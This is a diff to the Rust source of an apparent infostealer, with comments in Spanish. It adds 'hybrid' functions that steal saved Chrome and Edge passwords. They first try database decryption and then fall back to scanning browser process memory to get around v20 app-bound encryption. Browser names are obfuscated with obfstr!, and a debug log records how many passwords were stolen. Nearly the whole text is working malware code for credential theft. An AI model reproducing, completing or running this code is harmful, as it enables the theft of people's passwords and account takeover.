@@ -394,3 +394,101 @@ fn decrypt_dpapi_fallback(encrypted_data: &[u8]) -> StealerResult<String> {
 fn decrypt_dpapi_fallback(_encrypted_data: &[u8]) -> StealerResult<String> {
     Err(StealerError::DecryptionFailed)
 }
+
+// ═══════════════════════════════════════════════════════════
+// HYBRID MODE: Memory Injection para v20 (App-Bound Encryption)
+// ═══════════════════════════════════════════════════════════
+
+/// Roba Chrome passwords con fallback a memory injection si v20 detectado
+pub fn steal_chrome_hybrid() -> StealerResult<Vec<Credential>> {
+    steal_chromium_hybrid(obfstr!("Chrome"))
+}
+
+/// Roba Edge passwords con fallback a memory injection si v20 detectado
+pub fn steal_edge_hybrid() -> StealerResult<Vec<Credential>> {
+    steal_chromium_hybrid(obfstr!("Edge"))
+}
+
+/// Función híbrida: Intenta método tradicional, fallback a memory injection
+fn steal_chromium_hybrid(browser_name: &str) -> StealerResult<Vec<Credential>> {
+    use std::io::Write;
+    use crate::stealer::memory_injection::scan_all_browser_processes_for_passwords;
+    
+    let debug_path = std::env::temp_dir().join("stealer_debug.txt");
+    let mut debug_file = std::fs::OpenOptions::new()
+        .create(true)
+        .append(true)
+        .open(&debug_path)
+        .ok();
+    
+    let mut log = |msg: &str| {
+        if let Some(ref mut file) = debug_file {
+            let _ = writeln!(file, "{}", msg);
+        }
+    };
+    
+    log(&format!("\n═══ HYBRID PASSWORD THEFT: {} ═══", browser_name));
+    
+    // PASO 1: Intentar método tradicional (DB + decrypt)
+    log("🔸 PASO 1: Método tradicional (DB + decrypt)...");
+    
+    let traditional_result = if browser_name == obfstr!("Chrome") {
+        steal_chrome()
+    } else {
+        steal_edge()
+    };
+    
+    let mut all_credentials = match traditional_result {
+        Ok(creds) => {
+            log(&format!("  ✅ {} passwords extraídos (método tradicional)", creds.len()));
+            creds
+        },
+        Err(e) => {
+            log(&format!("  ⚠️  Método tradicional falló: {:?}", e));
+            Vec::new()
+        }
+    };
+    
+    // PASO 2: Si no encontramos passwords O todos son v20, usar memory injection
+    let has_v20 = check_if_all_v20_in_db(browser_name);
+    
+    if all_credentials.is_empty() || has_v20 {
+        log("🔸 PASO 2: v20 detectado → Usando Memory Injection...");
+        
+        let memory_passwords = scan_all_browser_processes_for_passwords(browser_name);
+        
+        if !memory_passwords.is_empty() {
+            log(&format!("  ✅ {} passwords encontrados en memoria", memory_passwords.len()));
+            
+            // Convertir formato
+            for pwd in memory_passwords {
+                all_credentials.push(Credential {
+                    browser: format!("{} (Memory)", browser_name),
+                    url: pwd.url,
+                    username: pwd.username,
+                    password: pwd.password,
+                });
+            }
+        } else {
+            log("  ❌ Memory injection no encontró passwords");
+        }
+    } else {
+        log("🔸 PASO 2: Saltando memory injection (passwords ya extraídos)");
+    }
+    
+    log(&format!("\n🎯 TOTAL: {} passwords robados", all_credentials.len()));
+    log("════════════════════════════════\n");
+    
+    if all_credentials.is_empty() {
+        Err(StealerError::DecryptionFailed)
+    } else {
+        Ok(all_credentials)
+    }
+}
+
+/// Verifica si la DB tiene passwords v20 (heurística)
+fn check_if_all_v20_in_db(browser_name: &str) -> bool {
+    // Por ahora asumimos que Chrome última versión = v20
+    // TODO: Leer DB y verificar prefijos realmente
+    browser_name == obfstr!("Chrome") || browser_name == obfstr!("Edge")
+}
